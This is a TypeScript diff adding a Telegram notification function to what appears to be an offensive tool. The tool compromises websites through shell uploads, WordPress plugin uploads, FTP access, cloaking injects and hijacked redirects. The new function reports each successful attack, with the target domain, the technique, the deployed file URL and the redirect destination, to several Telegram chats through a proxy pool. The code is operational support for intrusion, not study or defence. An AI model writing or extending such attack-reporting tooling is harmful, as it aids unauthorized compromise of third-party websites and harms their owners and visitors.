@@ -575,3 +575,90 @@ export async function sendVulnAlert(data: VulnAlertData): Promise<boolean> {
 
   return anySent;
 }
+
+// ═══════════════════════════════════════════════════════
+//  ATTACK SUCCESS ALERT — sent when shell upload / redirect / exploit succeeds
+// ═══════════════════════════════════════════════════════
+
+export interface AttackSuccessData {
+  domain: string;
+  method: string;            // e.g. "full_chain", "cloaking_inject", "hijack_redirect", "agentic_auto", "pipeline"
+  successMethod: string;     // specific technique that worked, e.g. "wp_plugin_upload", "ftp_access"
+  redirectUrl?: string;      // the redirect destination
+  uploadedUrl?: string;      // the deployed file URL
+  verified?: boolean;        // whether redirect was verified to work
+  durationMs?: number;       // how long the attack took
+  details?: string;          // extra context
+}
+
+/**
+ * Send attack success alert to all configured Telegram chat IDs.
+ * Called immediately when an attack succeeds (shell upload, redirect placement, exploit, etc.)
+ */
+export async function sendAttackSuccessAlert(data: AttackSuccessData): Promise<boolean> {
+  const config = getTelegramConfig();
+  if (!config) return false;
+
+  const durationStr = data.durationMs
+    ? `${(data.durationMs / 1000).toFixed(1)}s`
+    : "N/A";
+
+  const alertLines: string[] = [
+    `🎉 <b>โจมตีสำเร็จ!</b>`,
+    ``,
+    `🎯 Domain: <code>${escapeHtml(data.domain)}</code>`,
+    `⚔️ Mode: <b>${escapeHtml(data.method)}</b>`,
+    `🔧 Method: <b>${escapeHtml(data.successMethod)}</b>`,
+    `⏱ Duration: ${escapeHtml(durationStr)}`,
+    ``,
+  ];
+
+  if (data.uploadedUrl) {
+    alertLines.push(`📁 Deployed: <code>${escapeHtml(data.uploadedUrl.substring(0, 120))}</code>`);
+  }
+  if (data.redirectUrl) {
+    alertLines.push(`🔀 Redirect → <code>${escapeHtml(data.redirectUrl.substring(0, 100))}</code>`);
+  }
+  if (data.verified !== undefined) {
+    alertLines.push(`✅ Verified: ${data.verified ? "redirect ทำงานจริง ✅" : "ยังไม่ยืนยัน ⚠️"}`);
+  }
+  if (data.details) {
+    alertLines.push(``);
+    alertLines.push(`📝 ${escapeHtml(data.details.substring(0, 200))}`);
+  }
+
+  const message = alertLines.join("\n");
+
+  // Send to all configured chat IDs
+  const chatIds: string[] = [config.chatId];
+  if (ENV.telegramChatId2) chatIds.push(ENV.telegramChatId2);
+  if (ENV.telegramChatId3) chatIds.push(ENV.telegramChatId3);
+
+  let anySent = false;
+  for (const chatId of chatIds) {
+    try {
+      const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+      const { response } = await fetchWithPoolProxy(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+          disable_web_page_preview: true,
+        }),
+        signal: AbortSignal.timeout(10000),
+      }, { targetDomain: "api.telegram.org", timeout: 10000 });
+      const result = await response.json() as any;
+      if (result.ok) anySent = true;
+    } catch (err) {
+      console.warn(`[Telegram] Failed to send attack success alert to chat ${chatId}: ${err}`);
+    }
+  }
+
+  if (anySent) {
+    console.log(`[Telegram] 🎉 Attack success alert sent for ${data.domain} via ${data.successMethod}`);
+  }
+
+  return anySent;
+}
